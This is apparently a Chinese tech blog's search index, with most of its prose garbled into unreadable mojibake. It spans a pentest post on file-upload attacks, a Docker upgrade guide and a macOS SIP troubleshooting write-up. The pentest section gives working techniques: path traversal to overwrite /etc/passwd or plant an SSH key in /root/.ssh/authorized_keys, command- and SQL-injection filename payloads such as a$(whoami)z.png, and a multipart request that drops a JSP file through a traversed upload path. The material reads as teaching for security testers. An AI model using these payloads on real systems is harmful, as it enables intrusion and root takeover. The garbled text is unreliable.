å¦‚å°†æ–‡ä»¶åè®¾ç½®ä¸º../../../../etc/passwdï¼Œç„¶åä¸Šä¼ å¯¹åº”çš„å†…å®¹ï¼Œé‚£ä¹ˆåˆ™æœ‰å¯èƒ½ç›´æ¥è¦†ç›–æ‰/etc/passwd ä¸€èˆ¬æƒ…å†µä¸‹å°½é‡å»è¦†ç›–ä¸ä¼šå¯¹ç³»ç»Ÿäº§ç”Ÿå½±å“ä¸”æˆ‘ä»¬å¯ä»¥ç›´æ¥è§‚å¯Ÿåˆ°çš„æ–‡ä»¶ï¼Œå¦‚robots.txtç­‰ ä¸Šä¼ è¦†ç›–æ–‡ä»¶ æœ‰ç‚¹ç±»ä¼¼Rediså†™ssh å†™SSHå…¬é’¥ è¦†ç›– /root/.ssh/authorized_keys æ–‡ä»¶ã€‚å¦‚æœè¿™ä¸ªæ–‡ä»¶åŒ…å«æˆ‘ä»¬æ§åˆ¶çš„ç§é’¥çš„å…¬é’¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»¥root ç”¨æˆ·é€šè¿‡SSHè®¿é—®ç³»ç»Ÿã€‚ ä½¿ç”¨ ssh-keygen åˆ›å»ºä¸€ä¸ª SSH å¯†é’¥å¯¹ï¼Œä»¥åŠä¸€ä¸ªåä¸º authorized_keysçš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¹‹å‰åˆ›å»ºçš„å…¬é’¥ã€‚ kali@kali:~$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in fileup Your public key has been saved in fileup.pub ... kali@kali:~$ cat fileup.pub \u003e authorized_keys ä¸ºæ–‡ä»¶ä¸Šä¼ å‡†å¤‡authorized_keys æ–‡ä»¶ ä½¿ç”¨ç›¸å¯¹è·¯å¾„ ../../../../../../../root/.ssh/authorized_keys ä¸Šä¼ å®ƒè¿›è¡Œè¦†ç›–ã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:1","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"SSRF å°è¯•å°† URL ä½œä¸ºæ–‡ä»¶åå‘é€ä»¥è·å–ç›² SSRFï¼Œä¾‹å¦‚filename=https://172.17.0.1/internal/fileã€‚ è¿˜å¯ä»¥å°è¯•åœ¨è¯·æ±‚ä¸­æ›´æ”¹type=\"file\"ä¸ºã€‚type=\"url\" ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:2","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"DOS åç«¯æ²¡æœ‰å¯¹æ–‡ä»¶åé•¿åº¦è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªåç§°è¾ƒå¤§çš„æ–‡ä»¶ï¼Œæœ‰æ—¶ä¼šå¯¼è‡´ DoSã€‚ æ¡ˆä¾‹ï¼šæŠ¥å‘Šï¼šå¤´åƒåç§°å‚æ•°å€¼è¿‡å¤§å¯¼è‡´å¹³å°ä¸Šå…¶ä»–ç”¨æˆ·å’Œç¨‹åºé­å— DoS æ”»å‡» ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:3","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"æ–‡ä»¶åæ³¨å…¥ åœ¨æ–‡ä»¶åä¸­åŠ å…¥ XSSã€SQLiã€å‘½ä»¤æ³¨å…¥payloadã€‚ åœ¨æ–‡ä»¶åä¸­åŠ å…¥æ”»å‡»è½½è·ï¼ŒæœåŠ¡ç«¯å¯èƒ½å¯¹ä¸Šä¼ çš„æ–‡ä»¶åè¿›è¡Œå„ç§å¤„ç†ï¼Œå¦‚å±•ç¤ºåˆ°é¡µé¢ã€å­˜å‚¨åˆ°æ•°æ®åº“ç­‰ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨å„ç§å„æ ·çš„æ³¨å…¥ï¼Œå¦‚XSSã€SQLIã€å‘½ä»¤æ³¨å…¥ç­‰ å¦‚ä¸Šä¼ æ–‡ä»¶åä¸ºtest.pngï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®¾ç½®å˜é‡ä¸ºÂ§testÂ§.pngï¼Œç„¶åfuzzä¸€ä¸‹å„ç§æ³¨å…¥çš„payloadï¼Œå¦‚ï¼š a$(whoami)z.png a`whoami`z.png a';select+sleep(10);--z.png sleep(10)-- -.png \u003ch1\u003etest\u003ch1\u003e.png ${2*3} å‘½ä»¤æ³¨å…¥çš„æƒ…å†µï¼š æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡ç«¯é€šè¿‡ç³»ç»Ÿå‘½ä»¤è¿›è¡Œæ–‡ä»¶çš„é‡å‘½åã€å¤åˆ¶ã€ç§»åŠ¨ã€åˆ é™¤ç­‰åŠ¨ä½œï¼Œå¯èƒ½è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€‚æœªå¯¹æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å‘½ä»¤æ³¨å…¥ã€‚ å‚è€ƒï¼š RCE vulnerability in a file name Remote Unrestricted file Creation/Deletion and Possible RCE. ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:4","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.13. æ–‡ä»¶è·¯å¾„å¯æ§ è·¯å¾„éå† POST /uai/download/uploadfileToPath.htm HTTP/1.1 â€¦â€¦â€¦â€¦ -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png \u003c%out.println('test123');%\u003e -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- å‚è€ƒï¼š Unrestricted file upload (RCE) ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:13:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.14. å…ƒæ•°æ®æ³„æ¼ å…ƒæ•°æ®æ˜¯ç…§ç‰‡èƒŒåçš„æ•…äº‹ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬å›¾åƒæ–‡ä»¶æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼Œåœ¨å“ªé‡Œå’Œä½•æ—¶åˆ›å»ºçš„ã€‚å®ƒè¿˜æè¿°äº†ç…§ç‰‡çš„å†…å®¹ï¼Œç¡®å®šäº†æ‘„å½±å¸ˆï¼Œå¹¶å‘æ‚¨å±•ç¤ºäº†å›¾åƒåœ¨åæœŸå¤„ç†ä¸­æ˜¯å¦‚ä½•ç¼–è¾‘çš„ã€‚ç®€å•åœ°è¯´ï¼Œå‡è®¾æ‚¨ä½¿ç”¨æ•°ç ç›¸æœºå•å‡»äº†ä¸€å¼ å›¾ç‰‡ï¼Œå½“è¯¥å›¾åƒè¢«å¤„ç†å¹¶ä¿å­˜åœ¨å­˜å‚¨è®¾å¤‡ä¸Šæ—¶ï¼Œä¸€äº›å±æ€§è¢«æ·»åŠ åˆ°æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚ä½œè€…ã€ä½ç½®ã€è®¾å¤‡ä¿¡æ¯å’Œå…¶ä»–é€‚ç”¨äºæè¿°å›¾åƒä¿¡æ¯çš„ä¿¡æ¯ã€‚ å¦‚æœæœåŠ¡ç«¯å¯¹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡æœªè¿›è¡Œå¤„ç†å°±ç›´æ¥å±•ç¤ºï¼Œé‚£ä¹ˆå°†å¯èƒ½ä¼šå¯¼è‡´æºæ•°æ®æ³„æ¼ï¼›é€šå¸¸æƒ…å†µä¸‹ï¼Œå…ƒæ•°æ®ä¸­åŒ…å«GPSåœ°å€ã€è®¾å¤‡ä¿¡æ¯ç­‰ï¼Œä¼šè¢«å½“ä½œä½å±ã€‚ Note å…ƒæ•°æ®æ³„æ¼ä¸ä»…é™äºå›¾ç‰‡ï¼Œè¿˜å¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶æ ¼å¼ä¸­æ‰¾åˆ°ï¼Œå¦‚PDF æ£€æŸ¥æ–¹æ³•ï¼š åœ¨å¤´åƒä¸Šä¼ ç­‰å›¾ç‰‡å¯ä»¥è¢«æšä¸¾çš„åŠŸèƒ½ç‚¹ä¸Šä¼ åŒ…å«æœ‰exifæ•æ„Ÿä¿¡æ¯çš„å›¾ç‰‡ï¼Œæ²¡æœ‰çš„è¯å¯ä»¥ç”¨æ‰‹æœºç°æ‹ ä¸‹è½½åˆšæ‰ä¸Šä¼ çš„å›¾ç‰‡ï¼ˆå¦‚æœç”¨ä¸‹é¢çš„åœ¨çº¿å¹³å°è¿™ä¸€æ­¥å¯ä»¥çœç•¥ï¼‰ ä½¿ç”¨ http://exif.regex.info/exif.cgi æˆ–è€… exiftool å»åˆ†ææ•°æ® å‚è€ƒï¼š EXIF metadata not stripped from JPG group logosï¼Œéšç§æ³„éœ²é—®é¢˜ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:14:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ç«  https://blog.gm7.org/ä¸ªäººçŸ¥è¯†åº“/01.æ¸—é€æµ‹è¯•/02.WEBæ¼æ´/16.æ–‡ä»¶ä¸Šä¼  https://github.com/c0ny1/upload-labs https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:15:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["é—®é¢˜è§£å†³","Cloud"],"content":"å‰è¨€ å› ä¸ºéœ€è¦å®‰è£…minikubeï¼Œå…¶ä¸­æœ‰Dockerç‰ˆæœ¬è¦æ±‚ï¼Œå½“å‰ç‰ˆæœ¬å¤ªä½äº†ï¼Œéœ€è¦å‡çº§ã€‚ [root@localhost xavier]# minikube start --driver=docker ğŸ˜„ minikube v1.32.0 on Centos 7.9.2009 âœ¨ Using the docker driver based on user configuration ğŸ’£ Exiting due to PROVIDER_DOCKER_VERSION_EXIT_1: \"docker version --format \u003cno value\u003e-\u003cno value\u003e:\u003cno value\u003e\" exit status 1: template: :1:44: executing \"\" at \u003c.Server.Platform.Nam...\u003e: can't evaluate field Platform in type *types.Version ğŸ“˜ Documentation: https://minikube.sigs.k8s.io/docs/drivers/docker/ ç¡®è®¤å½“å‰ç‰ˆæœ¬ï¼š docker -v docker --version docker version [root@localhost xavier]# docker --version Docker version 1.13.1, build 7d71120/1.13.1 æ£€æŸ¥å½“å‰å®‰è£…çš„è½¯ä»¶åŒ… rpm -qa | grep docker yum list installed | grep docker [root@localhost xavier]# yum list installed | grep docker docker.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras docker-client.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras docker-common.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras ","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:1:0","tags":["é—®é¢˜è§£å†³","Docker","Cloud"],"title":"Dockerä½ç‰ˆæœ¬å‡çº§","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["é—®é¢˜è§£å†³","Cloud"],"content":"yumå®‰è£… é…ç½®yumé•œåƒæºï¼Œæ›´æ–°yumï¼Œ # å®‰è£…yumç®¡ç†å·¥å…· yum install -y yum-utils # æ·»åŠ å›½å†…é•œåƒæº yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sudo yum update -y æ£€ç´¢æƒ³è¦å®‰è£…çš„ç‰ˆæœ¬ yum list docker-ce --showduplicates|sort -r [root@localhost xavier]# yum list docker-ce --showduplicates|sort -r ... docker-ce.x86_64 3:18.09.6-3.el7 docker-ce-stable docker-ce.x86_64 3:18.09.5-3.el7 docker-ce-stable docker-ce.x86_64 18.03.1.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 18.03.0.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 17.12.1.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stable ... å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„docker yum -y install docker-ce-18.03.1.ce-1.el7.centos [root@localhost ~]# systemctl start docker [root@localhost ~]# docker --version yumå®‰è£…æœ‰å¯èƒ½æ— æ³•å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºyumåº“ç›¸å¯¹å®˜ç½‘ä¼šæ»åä¸€äº›ã€‚ ","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:2:0","tags":["é—®é¢˜è§£å†³","Docker","Cloud"],"title":"Dockerä½ç‰ˆæœ¬å‡çº§","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["é—®é¢˜è§£å†³","Cloud"],"content":"å®‰è£…æœ€æ–°ç‰ˆæœ¬ è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦å¯¹åŸæœ‰dockerè¿›è¡Œå¸è½½ sudo yum remove docker.xxxx [root@localhost xavier]# yum remove docker.x86_64 docker-client.x86_64 docker-common.x86_64 curl ä»å®˜ç½‘è·å–æœ€æ–°ç‰ˆæœ¬ curl -fsSL https://get.docker.com/ | sh [root@localhost xavier]# curl -fsSL https://get.docker.com/ | sh # Executing docker install script, commit: e5543d473431b782227f8908005543bb4389b8de + sh -c 'yum install -y -q yum-utils' Package yum-utils-1.1.31-54.el7_8.noarch already installed and latest version + sh -c 'yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo' Loaded plugins: fastestmirror, product-id, subscription-manager This system is not registered with an entitlement server. You can use subscription-manager to register. adding repo from: https://download.docker.com/linux/centos/docker-ce.repo grabbing file https://download.docker.com/linux/centos/docker-ce.repo to /etc/yum.repos.d/docker-ce.repo repo saved to /etc/yum.repos.d/docker-ce.repo + '[' stable '!=' stable ']' + sh -c 'yum makecache' Loaded plugins: fastestmirror, product-id, search-disabled-repos, subscription-manager This system is not registered with an entitlement server. You can use subscription-manager to register. Loading mirror speeds from cached hostfile * base: mirrors.bupt.edu.cn * extras: mirrors.bupt.edu.cn * updates: mirrors.bupt.edu.cn base | 3.6 kB 00:00:00 docker-ce-stable | 3.5 kB 00:00:00 extras | 2.9 kB 00:00:00 updates | 2.9 kB 00:00:00 Metadata Cache Created + sh -c 'yum install -y -q docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-plugin' warning: /var/cache/yum/x86_64/7/docker-ce-stable/packages/docker-buildx-plugin-0.13.1-1.el7.x86_64.rpm: Header V4 RSA/SHA512 Signature, key ID 621e9f35: NOKEY Public key for docker-buildx-plugin-0.13.1-1.el7.x86_64.rpm is not installed Importing GPG key 0x621E9F35: Userid : \"Docker Release (CE rpm) \u003cdocker@docker.com\u003e\" Fingerprint: 060a 61c5 1b55 8a7f 742b 77aa c52f eb6b 621e 9f35 From : https://download.docker.com/linux/centos/gpg ================================================================================ To run Docker as a non-privileged user, consider setting up the Docker daemon in rootless mode for your user: dockerd-rootless-setuptool.sh install Visit https://docs.docker.com/go/rootless/ to learn about rootless mode. To run the Docker daemon as a fully privileged service, but granting non-root users access, refer to https://docs.docker.com/go/daemon-access/ WARNING: Access to the remote API on a privileged Docker daemon is equivalent to root access on the host. Refer to the 'Docker daemon attack surface' documentation for details: https://docs.docker.com/go/attack-surface/ ================================================================================ é‡å¯doker service docker restart docker -v [root@localhost xavier]# service docker restart Redirecting to /bin/systemctl restart docker.service [root@localhost xavier]# docker -v Docker version 26.0.1, build d260a54 ","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:3:0","tags":["é—®é¢˜è§£å†³","Docker","Cloud"],"title":"Dockerä½ç‰ˆæœ¬å‡çº§","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["é—®é¢˜è§£å†³"],"content":"MacOS åˆè¯†SIPâ€”â€”è§£å†³å¿«æ·æŒ‡ä»¤shè„šæœ¬æŠ¥é”™ï¼š'Operation not permitted'","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"å‰è¨€ å› ä¸ºä¸€äº›åŸå› ï¼Œè®¾è®¡äº†ä¸€å¥—å¿«æ·æŒ‡ä»¤ï¼Œä¸­é—´æ¶‰åŠåˆ°ä¸€ä¸ªshè„šæœ¬çš„è¿è¡Œï¼Œé€šè¿‡å¿«æ·æŒ‡ä»¤è¿è¡Œæ—¶å°±ä¼šæŠ¥é”™ï¼šoperation not permitted å¥‡æ€ªçš„æ˜¯åœ¨å¿«æ·æŒ‡ä»¤çª—å£ä¸‹è¿è¡Œä¸€åˆ‡æ­£å¸¸ï¼Œä½†æ˜¯ä»å…¶ä»–åœ°æ–¹ç›´æ¥è°ƒç”¨ï¼Œä¾‹å¦‚é€šè¿‡Command+Space æ‰“å¼€Spotlight Searchä¸‹æ‰§è¡Œå°±æ¢å‡ºç°æŠ¥é”™ã€‚ ä»¥æµ‹è¯•ç”¨å¿«æ·æŒ‡ä»¤â€Mytestâ€œä¸ºä¾‹ï¼Œå¿«æ·æŒ‡ä»¤çª—å£ä¸‹è¿è¡ŒæˆåŠŸæˆªå›¾ï¼š é€šè¿‡Spotlight Searchè¿è¡ŒMytestå¤±è´¥æˆªå›¾ï¼š æ¥ä¸‹å»è®°å½•ä¸‹æ•´ä¸ªæ’æŸ¥è¿‡ç¨‹ã€‚ çœæµï¼šè§£å†³åŠæ³•ï¼šæ¢ä¸ªç›®å½•ï¼Œå°†è„šæœ¬ä»ç³»ç»Ÿç›®å½•ç§»åŠ¨åˆ°ç”¨æˆ·ç›®å½•ä¸‹ã€‚ mv /users/xavier/Downloads/tmp/test.sh /users/xavier/MyScripts/test.sh â€‹ æ–‡ç« ç›®çš„ï¼šåˆ†äº«æ’æŸ¥æ€è·¯å’Œè¿‡ç¨‹ã€ä»‹ç»SIP ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:1:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"Step 1ï¼šåˆæ­¥æ£€æŸ¥ é‡åˆ° â€œoperation not permittedâ€ é”™è¯¯ï¼Œè¿™é€šå¸¸æ„å‘³ç€ç³»ç»Ÿå®‰å…¨è®¾ç½®æˆ–æƒé™è®¾ç½®é˜»æ­¢äº†è„šæœ¬çš„æ‰§è¡Œã€‚ æ¥ä¸‹å»è¿›è¡Œäº†å¦‚ä¸‹æ£€æŸ¥ï¼š è„šæœ¬å†…å®¹ï¼šæ£€æŸ¥è„šæœ¬å†…å®¹ï¼Œç¡®ä¿è„šæœ¬ä¸­æ²¡æœ‰å°è¯•æ‰§è¡Œéœ€è¦æ›´é«˜æƒé™çš„æ“ä½œã€‚æ²¡é—®é¢˜ã€‚ shè„šæœ¬æ‰§è¡Œæƒé™ï¼Œchmod 755 test.shï¼Œå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚æ²¡é—®é¢˜ ç³»ç»Ÿåå¥½è®¾ç½®ï¼šæ‰“å¼€â€œç³»ç»Ÿåå¥½è®¾ç½®â€ \u003e â€œå®‰å…¨æ€§ä¸éšç§â€ \u003e â€œéšç§â€æ ‡ç­¾é¡µï¼Œæ£€æŸ¥â€œå®Œå…¨ç£ç›˜è®¿é—®â€åˆ—è¡¨ï¼Œç»™å¿«æ·æŒ‡ä»¤åº”ç”¨æˆ–ç»ˆç«¯åº”ç”¨ï¼ˆterminalï¼‰è®¿é—®ç£ç›˜ä¸Šæ–‡ä»¶çš„æƒé™ã€‚ æ²¡é—®é¢˜ã€‚ Gatekeeper è®¾ç½®ï¼šåœ¨â€œå®‰å…¨æ€§ä¸éšç§â€ \u003e â€œé€šç”¨â€æ ‡ç­¾é¡µä¸­ï¼Œè®¾ç½®å…è®¸ä»â€œApp Store å’Œè¢«è®¤åŒçš„å¼€å‘è€…â€æˆ–â€œä»»ä½•æ¥æºâ€å®‰è£…åº”ç”¨ã€‚æ²¡é—®é¢˜ ç®¡ç†å‘˜æƒé™ï¼šå°è¯•ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œshè„šæœ¬ã€‚æ— å½±å“ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚ åœ¨æˆ‘å½“å‰å·²æœ‰è®¤çŸ¥ä¸­æ‰€æœ‰å¯èƒ½çš„æ–¹æ³•éƒ½ä¸èƒ½è§£å†³é—®é¢˜ï¼Œé‚£ä¹ˆè¦å°è¯•å®šä½é—®é¢˜äº§ç”Ÿçš„åŸå› ã€‚ ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:2:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"Step 2ï¼šæ—¥å¿—è°ƒæŸ¥ è¿™æ˜¯ä¸€ä¸ªè¶…å‡ºæˆ‘å½“å‰è®¤çŸ¥çš„ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦ä¸€æ­¥æ­¥æ’æŸ¥å®šä½é—®é¢˜ï¼Œç›®å‰å¿«æ·æŒ‡ä»¤ç»™å‡ºçš„åé¦ˆ.../test.sh: Operation not permittedå¤ªç²—ç³™ï¼Œéœ€è¦æ‰¾æ›´ç²¾ç»†çš„æŠ¥é”™æ—¥å¿—ã€‚ ä½¿ç”¨MacOSçš„ æ§åˆ¶å°åº”ç”¨ï¼ˆConsole.appï¼‰ä»¥è·å–æ›´å¤šå…³äºé”™è¯¯çš„è¯¦ç»†ä¿¡æ¯ã€‚ åˆé‡å¤æ‰§è¡Œäº†ä¸€è¾¹å¿«æ·æŒ‡ä»¤ï¼Œä½¿ç”¨Console.appæŠ“å–æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åé€šè¿‡æœç´¢test.shå®šä½åˆ°è¯¦ç»†çš„æ—¥å¿—å†…å®¹ï¼š BackgroundShortcutRunnerè¿›ç¨‹å°±æ˜¯å¿«æ·æŒ‡ä»¤appï¼Œæ³¨æ„åˆ°åœ¨å®ƒä¸Šé¢æœ‰ä¸€æ¡kernelè¿›ç¨‹çš„æŠ¥é”™ä¿¡æ¯ï¼Œå†…å®¹å¦‚ä¸‹ï¼š System Policy: bash(1538) deny(1) file-read-data /Users/xavier/Downloads/tmp/test.sh æ¥ä¸‹å»å°±æ˜¯æœç´¢è¯¥æŠ¥é”™ä¿¡æ¯æ˜¯ä»€ä¹ˆæ„æ€ï¼Œæ€ä¹ˆè§£å†³ã€‚ ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:3:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"Step 3ï¼šå®šä½é—®é¢˜ System Policy: bash(1538) deny(1) file-read-data /Users/xavier/Downloads/tmp/test.sh é€šè¿‡æœç´¢å¾—çŸ¥ï¼Œè¿™ä¸ªæ—¥å¿—ä¿¡æ¯è¡¨æ˜ macOS çš„ç³»ç»Ÿç­–ç•¥ï¼ˆå¾ˆå¯èƒ½æ˜¯ SIPï¼Œå³ System Integrity Protectionï¼‰é˜»æ­¢äº† bash è¿›ç¨‹ï¼ˆè¿›ç¨‹IDä¸º1538ï¼‰è¯»å– /Users/xavier/Downloads/tmp/test.sh æ–‡ä»¶æ•°æ®ã€‚ é—®é¢˜å°±åœ¨è¿™ä¸ªSIPç­–ç•¥ã€‚å½“è„šæœ¬ä½äºå— SIP ä¿æŠ¤çš„ç›®å½•ä¸­ï¼Œæˆ–è€…è„šæœ¬è¯•å›¾æ‰§è¡Œè¢« SIP ä¿æŠ¤çš„æ“ä½œï¼Œå°±å¯èƒ½ä¼šé‡åˆ°æƒé™é—®é¢˜ã€‚ è¿™æ¬¡é‡åˆ°çš„æƒ…å†µå°±æ˜¯å› ä¸ºæˆ‘ä»¬çš„è„šæœ¬è¢«æ”¾åœ¨äº†å—SIPä¿æŠ¤çš„ç›®å½•ä¸­ï¼Œå› æ­¤è§£å†³åŠæ³•éå¸¸ç®€å•ã€‚ åœ¨è§£å†³é—®é¢˜ä¹‹å‰ï¼Œæˆ‘æƒ³å…ˆäº†è§£ä¸‹SIPã€‚ â€‹ SIPæ˜¯ä»€ä¹ˆï¼Ÿ SIP ï¼Œå³ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤ï¼ˆSystem Integrity Protectionï¼‰ï¼Œæ˜¯ macOS çš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œç”¨äºä¿æŠ¤ç³»ç»Ÿæ–‡ä»¶å’Œç›®å½•ï¼Œé˜²æ­¢è¿™äº›æ–‡ä»¶åŠç›®å½•è¢«æ²¡æœ‰ç‰¹å®šæƒé™çš„è¿›ç¨‹ä¿®æ”¹ï¼ŒåŒ…æ‹¬rootç”¨æˆ·æˆ–æ‹¥æœ‰rootæƒé™çš„ç”¨æˆ·ã€‚ SIPé€šè¿‡ä¸€ç³»åˆ—å†…æ ¸å¼ºåˆ¶å®æ–½çš„æœºåˆ¶æ¥è¾¾æˆè¿™ä¸€ç›®æ ‡ï¼Œå®ƒé™åˆ¶äº†å…³é”®ç³»ç»Ÿæ–‡ä»¶çš„å¯å†™æ€§ï¼Œå¹¶å¯¹ç‰¹å®šå…³é”®æ–‡ä»¶ç³»ç»Ÿä½ç½®ä¸­çš„ç»„ä»¶è¿›è¡Œåªè¯»é™åˆ¶ã€‚ SIPçš„ä¿æŠ¤èŒƒå›´åŒ…æ‹¬å¤šä¸ªé‡è¦çš„ç³»ç»Ÿç›®å½•å’Œæ–‡ä»¶ï¼Œä¾‹å¦‚/Systemã€/usrã€/binã€/sbinä»¥åŠOSXçš„é¢„è£…åº”ç”¨ã€‚è¿™äº›ç›®å½•å’Œæ–‡ä»¶åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šè¢«åŠ è½½ï¼Œå¹¶ä¸”å¯¹äºä¿æŒç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§è‡³å…³é‡è¦ã€‚SIPç¡®ä¿è¿™äº›æ–‡ä»¶å’Œç›®å½•ä¸ä¼šè¢«æ¶æ„ä»£ç æˆ–å…¶ä»–æœªç»æˆæƒçš„è¿›ç¨‹ä¿®æ”¹ã€‚ ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:4:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"Step 4ï¼šè§£å†³é—®é¢˜ ä¹‹å‰è¯´äº†è¿™æ¬¡é‡åˆ°çš„é—®é¢˜å°±æ˜¯å› ä¸ºæˆ‘ä»¬çš„è„šæœ¬è¢«æ”¾åœ¨äº†å—SIPä¿æŠ¤çš„ç›®å½•ä¸­ï¼Œå› æ­¤è§£å†³åŠæ³•éå¸¸ç®€å•ï¼Œåªéœ€è¦å°†è„šæœ¬æ¢ä¸ªä½ç½®ï¼Œæ”¾åˆ°ç”¨æˆ·ç›®å½•ä¸‹å³å¯ï¼ŒSIP é€šå¸¸ä¸ä¼šé˜»æ­¢è¯»å–ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ ç§»åŠ¨è„šæœ¬åˆ°ç”¨æˆ·ç›®å½•ï¼š mv /users/xavier/Downloads/tmp/test.sh /users/xavier/MyScripts/test.sh 